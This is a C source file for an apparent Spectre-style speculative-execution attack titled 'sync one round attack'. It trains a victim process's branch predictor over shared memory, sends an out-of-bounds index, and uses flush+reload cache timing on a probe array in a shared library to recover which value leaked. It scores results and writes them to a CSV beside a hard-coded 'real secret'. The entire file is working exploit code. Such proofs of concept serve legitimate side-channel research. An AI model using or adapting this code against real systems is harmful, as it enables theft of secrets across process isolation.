/**
 *	sync one round attack
 *
 *	Copyright (C) 2017  Jinbum Park <jinb.park@samsung.com>
*/

#include "common.h"
#include <stdbool.h>
#include <stdlib.h>
#include <libflush.h>
#include <stdio.h>

int lib_fd;
void *lib_addr;
U32 lib_size;

uint64_t threshold = 300;
libflush_session_t *session;
unsigned int score[10] = {0,};
unsigned int test_count = 0;

int malicious_idx = -1;
int training_idx = 0;

struct arr_type *probe_arr;
unsigned int off_probe_arr;

struct shm_msg *client_msg;
struct shm_msg *server_msg;

void bind_cpu(int cpuid)
{
    unsigned long mask = 0;

    if(cpuid == 0) mask = 1;
    else if(cpuid == 1) mask = 2;
    else if(cpuid == 2) mask = 4;
    else if(cpuid == 3) mask = 8;

    if(sched_setaffinity(0, sizeof(mask), (cpu_set_t*)&mask) < 0)
    {
        printf("sched_setaffinity error\n");
        return;
    }
}

void map_lib(const char *path)
{
	struct stat st;

	lib_fd = open(path, O_RDONLY);
	if(lib_fd < 0) {
		printf("open error\n");
		exit(-1);
	}

	fstat(lib_fd, &st);
	lib_size = st.st_size;

	lib_addr = mmap(NULL, lib_size, PROT_READ, MAP_PRIVATE, lib_fd, 0);
	if(lib_addr == NULL) {
		printf("mmap error\n");
		exit(-1);
	}
	
	probe_arr = (U8 *)lib_addr + off_probe_arr;
	printf("first val1 : %d\n", probe_arr[0].val1);
}

void string_to_hex(U8 *pIn, unsigned int pInLen, U8 *pOut)
{
   unsigned int i, j;
   unsigned int mul;
   char data = 0;

   for(i=0, j=0; i<pInLen; i++) {
       if(i % 2 == 0)
           mul = 16;
       else
           mul = 1;

       if(pIn[i] >= '0' && pIn[i] <= '9')
           data += ((pIn[i] - 48) * mul);
       else if(pIn[i] >= 'a' && pIn[i] <= 'f')
           data += ((pIn[i] - 87) * mul);
       else if(pIn[i] >= 'A' && pIn[i] <= 'F')
           data += ((pIn[i] - 55) * mul);
       else
           return;

       if(mul == 1)
       {
           pOut[j] = data;
           data = 0;
           j++;
       }
   }
}

static void hex_string_to_int(unsigned char *pIn, unsigned int pInLen, unsigned int *pOut)
{
    /* HexString must be Big-Endian!! */
    int is_little_endian = 0;
    unsigned int test = 0x10000001;
    char *ptr = (char*)&test;

    if(ptr[0] == 0x01)
    {
        is_little_endian = 1;
    }
    if(pInLen != sizeof(unsigned int) * 2)
    {
        return;
    }
    string_to_hex((unsigned char*)pIn, pInLen, (char*)pOut);

    if(is_little_endian)
    {
        char tmp;
        unsigned int i, j;

        ptr = (char*)pOut;
        for(i=0, j=sizeof(unsigned int)-1; i<sizeof(unsigned int); i++, j--)
        {
            if(i > j)
            {
                break;
            }
            tmp = ptr[i];
            ptr[i] = ptr[j];
            ptr[j] = tmp;
        }
    }
} 

void get_args(int argc, char **argv)
{
	if(argc != 7) {
		printf("USAGE: ./attack <test count> <training idx> <malicious idx> <threshold> <offset probe array> <shared library path>\n");
		printf("EXAMPLE: ./attack 10 0 -1 250 00000740 /usr/lib/libshared.so\n");
		exit(-1);
	}

	test_count = atoi(argv[1]);
	training_idx = atoi(argv[2]);
	malicious_idx = atoi(argv[3]);
	threshold = (uint64_t)atoi(argv[4]);
	hex_string_to_int(argv[5], strlen(argv[5]), &off_probe_arr);
	map_lib(argv[6]);
}


static inline void flush_probe_arr(unsigned int idx)
{	
	libflush_flush(session, probe_arr + idx);
}

static inline int reload_probe_arr_is_useful(unsigned int idx)
{
	uint64_t count;

	count = libflush_reload_address(session, probe_arr + idx);
	if(count < threshold)
		return 1;
	return 0;
}

void do_test_victim(int idx)
{
	U32 j;
	char reply_msg[MSG_SIZE_MAX] = {0,};

	/* prepare msg */
	client_msg->status = 0;
	client_msg->len = sizeof(int);
	
	/* send msg */
	memcpy(client_msg->msg, &idx, 4);
	client_msg->status = 1;

	/* read reply */
	while(1) {
		if(server_msg->status == 1) {
			memcpy(reply_msg, server_msg->msg, server_msg->len);
			server_msg->status = 0;
			break;
		}
	}
}

void print_result_to_csv(void)
{
	FILE *fp = NULL;
	char str[128] = {0,};
	unsigned i;

	fp = fopen("./result.csv", "w");
	if (!fp) {
		printf("fopen error\n");
		return;
	}

	snprintf(str, 128, "test count,%d\n", test_count);
	fwrite(str, 1, strlen(str), fp);
	
	fwrite("cache result\n", 1, strlen("cache result\n"), fp); 
	for (i=0; i<10; i++) {
		if (i == 9)
			snprintf(str, 128, "0x%lx\n", (unsigned long)(probe_arr + i));
		else
			snprintf(str, 128, "0x%lx,", (unsigned long)(probe_arr + i));
		fwrite(str, 1, strlen(str), fp);
	}
	for (i=0; i<10; i++) {
		if (i == 9)
			snprintf(str, 128, "%d\n", score[i]);
		else
			snprintf(str, 128, "%d,", score[i]);
		fwrite(str, 1, strlen(str), fp);
	}

	fwrite("\nreal secret\n", 1, strlen("\nreal secret\n"), fp);
	for (i=0; i<10; i++) {
		if (i == 9)
			snprintf(str, 128, "0x%lx\n", (unsigned long)(probe_arr + i));
		else
			snprintf(str, 128, "0x%lx,", (unsigned long)(probe_arr + i));
		fwrite(str, 1, strlen(str), fp);
	}
	for (i=0; i<10; i++) {
		if (i == 9)
			snprintf(str, 128, "%d\n", 0);
		else {
			if (i == 3)
				snprintf(str, 128, "%d,", 1);
			else
				snprintf(str, 128, "%d,", 0);
		}
		fwrite(str, 1, strlen(str), fp);
	}

	fclose(fp);
}

void do_attack(void)
{
	unsigned i, t, idx;
	int ret;
	volatile int z;

	memset(score, 0, sizeof(score));

	for (t=0; t<test_count; t++) {
		for (idx=0; idx<10; idx++) {
		
			/* train conditional branch of victim */
			for (i=0; i<10; i++) {
				do_test_victim(training_idx);
			}

			/* cache attack */
			flush_probe_arr(idx);
			
			do_test_victim(malicious_idx);

			ret = reload_probe_arr_is_useful(idx);
			if (ret)
				score[idx] += 1;
		}

		if (t % 20 == 0)
			printf("progress : %d / %d\n", t, test_count);
	}
}

void print_result(void)
{
	unsigned int i;

	printf("score : \n");
	for(i=0; i<10; i++) {
		printf("[%d] - %d\n", i, score[i]);
	}
	
	print_result_to_csv();
}

void init_libflush(void)
{
	bool r;

	r = libflush_init(&session, NULL);
	if(r == false) {
		printf("libflush_init error\n");
		exit(-1);
	}
}

void finalize_libflush(void)
{
	libflush_terminate(session);
}

int main(int argc, char **argv)
{
	void *addr;
	int fd;
	ssize_t nread;
	
	get_args(argc, argv);
	init_libflush();
	bind_cpu(1);

	/* get shm */
	if((fd = shm_open(SHM_NAME, O_RDWR, PERM_FILE)) == -1) {
		printf("shm_open error : %s\n", strerror(errno));
		return -1;
	}

	/* mmap */
	addr = mmap(NULL, MSG_SIZE_MAX, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if(addr == MAP_FAILED) {
		printf("mmap error : %s\n", strerror(errno));
		goto out;
	}

	client_msg = (struct shm_msg *)((char*)addr + SHM_CLIENT_BUF_IDX);
	server_msg = (struct shm_msg *)((char*)addr + SHM_SERVER_BUF_IDX);
	
	do_attack();
	print_result();

	/* send end msg */
	client_msg->status = 0;
	client_msg->len = sizeof(END_MSG);
	strncpy(client_msg->msg, END_MSG, client_msg->len);
	client_msg->status = 1;

out:
	/* close shm */
	if(munmap(addr, MSG_SIZE_MAX) == -1) {
		printf("munmap error : %s\n", strerror(errno));
	}

	if(close(fd) == -1) {
		printf("close error : %s\n", strerror(errno));
		return -1;
	}

	finalize_libflush();
	munmap(lib_addr, lib_size);
	close(lib_fd);
	return 0;
}
